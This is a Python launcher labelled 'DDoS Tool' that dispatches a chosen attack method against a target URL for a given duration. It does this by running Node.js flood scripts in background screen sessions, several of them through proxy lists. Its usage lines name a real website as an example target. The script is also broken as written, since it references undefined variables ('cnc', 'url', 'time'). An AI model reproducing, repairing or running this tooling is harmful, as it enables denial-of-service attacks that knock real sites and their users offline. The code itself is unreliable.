import argparse
import subprocess

def main():
    parser = argparse.ArgumentParser(description="DDoS Tool")
    parser.add_argument("-m", "--method", help="Specify the attack method", required=True)
    parser.add_argument("-u", "--url", help="Specify the target URL", required=True)
    parser.add_argument("-t", "--time", help="Specify the attack duration in seconds", required=True)

    args = parser.parse_args()

    try:
        if "http-kantot" in cnc:
            try:
                subprocess.run([f'screen -dm node ./core/http-kantot {url} {time} 5 512 '], shell=True)
                print("Successfully Attack to all linked Server...")
            except IndexError:
                print('Usage: http-kantot <target> <time>  ')
                print('Example: http-kantot http://xnxx.com 300 ')

        elif "https-mix" in cnc:
            try:
                subprocess.run([f'screen -dm node ./core/https-mix {url} {time} 3 120 '], shell=True)
                print("Successfully Attack to all linked Server...")
            except IndexError:
                print('Usage: https-mix <target> <time>  ')
                print('Example: https-mix http://xnxx.com 300 ')

        elif "tls-3" in cnc:
            try:
                subprocess.run([f'screen -dm node ./core/TLS-3 {url} {time} 32 4 proxy.txt '], shell=True)
                print("Successfully Attack to all linked Server...")
            except IndexError:
                print('Usage: tls-3 <target> <time>  ')
                print('Example: tls-3 http://xnxx.com 300 ')

        elif "tls-detect" in cnc:
            try:
                subprocess.run([f'screen -dm node ./core/TLS-DETECT.js {url} {time} 110 5 proxy.txt '], shell=True)
                print("Successfully Attack to all linked Server...")
            except IndexError:
                print('Usage: tls-detect [Target] [Time]  ')
                print('Example: tls-detect https://example.com/ 120 ')
                

        elif "http1" in cnc:
            try:
                subprocess.run([f'screen -dm node ./core/http1 GET  {url} http.txt {time} 124 5 '], shell=True)
                print("Successfully Attack to all linked Server...")
            except IndexError:
                print('Usage: http1 <host> <duration>  ')
                print('Example: http1 https://example.com/ 60 ')                

        elif "http2" in cnc:
            try:
                subprocess.run([f'screen -dm node ./core/http2 GET  {url} http.txt {time} 124 5 '], shell=True)
                print("Successfully Attack to all linked Server...")
            except IndexError:
                print('Usage: http2 <host> <duration>  ')
                print('Example: http2 https://example.com/ 60   ')
                
        elif "https-power" in cnc:
            try:
                subprocess.run([f'screen -dm node ./core/https-power GET  {url} http.txt {time} 124 5 '], shell=True)
                print("Successfully Attack to all linked Server...")
            except IndexError:
                print('Usage: https-power <host> <duration>  ')
                print('Example: https-power https://example.com/ 60  ')
               
        elif "nuke" in cnc:
            try:
                subprocess.run([f'screen -dm node ./core/nuke {url} {time} 5 http.txt 65 '], shell=True)
                print("Successfully Attack to all linked Server...")
            except IndexError:
                print('Usage: nuke https://xnxx.com/ 120 ')
                print('Example: nuke https://xnxx.com/ 120 ')
                
        elif "tls-vip" in cnc:
            try:
                subprocess.run([f'screen -dm node ./core/tls-vip {url} {time} 65 3 http.txt '], shell=True)
                print("Successfully Attack to all linked Server...")
            except IndexError:
                print('Usage: tls-vip <host> <duration>  ')
                print('Example: tls-vip https://example.com/ 60  ')

        elif "bypass" in cnc:
            try:
                subprocess.run([f'screen -dm node ./core/bypass {url} {time} 65 3 proxy.txt '], shell=True)
                print("Successfully Attack to all linked Server...")
            except IndexError:
                print('Usage: bypass <host> <duration>  ')
                print('Example: bypass https://example.com/ 60   ')
             
                                         
        elif "http-query" in cnc:
            try:
                subprocess.run([f'screen -dm node ./core/HTTP-QUERY.js {url} {time} 5 65 '], shell=True)
                print("Successfully Attack to all linked Server...")
            except IndexError:
                print('Usage: http-query <target> <time>  ')
                print('Example: http-query http://xnxx.com 300 ')

        elif "tls-1" in cnc:
            try:
                subprocess.run([f'screen -dm node ./core/TLS-1.js {url} {time} 32 4 proxy.txt '], shell=True)
                print("Successfully Attack to all linked Server...")
            except IndexError:
                print('Usage: tls-1 <host> <duration>  ')
                print('Example: tls-1 https://example.com/ 60  ')

        elif "bot" in cnc:
            try:
                subprocess.run([f'screen -dm node ./core/BOT.js {url} {time} 65 3 proxy.txt '], shell=True)
                print("Successfully Attack to all linked Server...")
            except IndexError:
                print('Usage: bot <host> <duration>  ')
                print('Example: bot https://example.com/ 60  ')
              
        elif "nox" in cnc:
            try:
                subprocess.run([f'screen -dm node ./core/NOX.js {url} {time} 65 5 proxy.txt '], shell=True)
                print("Successfully Attack to all linked Server...")
            except IndexError:
                print('Usage: nox <host> <duration>  ')
                print('Example: nox https://example.com/ 60  ')

        elif "tls" in cnc:
            try:
                subprocess.run([f'screen -dm node ./core/TLS.js {url} {time} 64 3 '], shell=True)
                print("Successfully Attack to all linked Server...")
            except IndexError:
                print('Usage: tls <host> <duration>  ')
                print('Example: tls https://example.com/ 60  ')
                
        elif "yolo" in cnc:
            try:        
                subprocess.run([f'screen -dm node ./core/YOLO.js {url} {time} 124 3 proxy.txt '], shell=True)
                print("Successfully Attack to all linked Server...")
            except IndexError:
                print('Usage: yolo <host> <duration>  ')
                print('Example: yolo https://example.com/ 60  ')
                
              
        elif "https" in cnc:
            try:
                subprocess.run([f'screen -dm node ./core/HTTPS.js {url} {time} 3 proxy.txt 64 '], shell=True)
                print("Successfully Attack to all linked Server...")
            except IndexError:
                print('Usage: https <host> <duration>  ')
                print('Example: https https://example.com/ 60  ')
                
                
        ####VVIP####                
        elif "bolt" in cnc:
            try:
                subprocess.run([f'screen -dm node utils/L4/./BOLT {url} {time} 64 5'], shell=True)
                print("Successfully Attack to all linked Server...")
            except IndexError:
                print('Usage: bolt <host> <duration>  ')
                print('Example: bolt https://example.com/ 60  ')
                
                
        elif "omg" in cnc:
            try:
                subprocess.run([f'screen -dm node utils/L4/./OMG GET {url} proxy.txt {time} 64 5'], shell=True)
                print("Successfully Attack to all linked Server...")
            except IndexError:
                print('Usage: omg <host> <duration>  ')
                print('Example: omg https://example.com/ 60  ')
                
        elif "browser" in cnc:
            try:
                subprocess.run([f'screen -dm node ./core/BROWSER.js {url} {time} 5 proxy.txt 65 1 '], shell=True)
                print("Successfully Attack to all linked Server...")
            except IndexError:
                print('Usage: browser <host> <duration>  ')
                print('Example: browser https://example.com/ 60  ')
    except IndexError:
        print('An error occurred. Check your input parameters.')

if __name__ == "__main__":
    main()
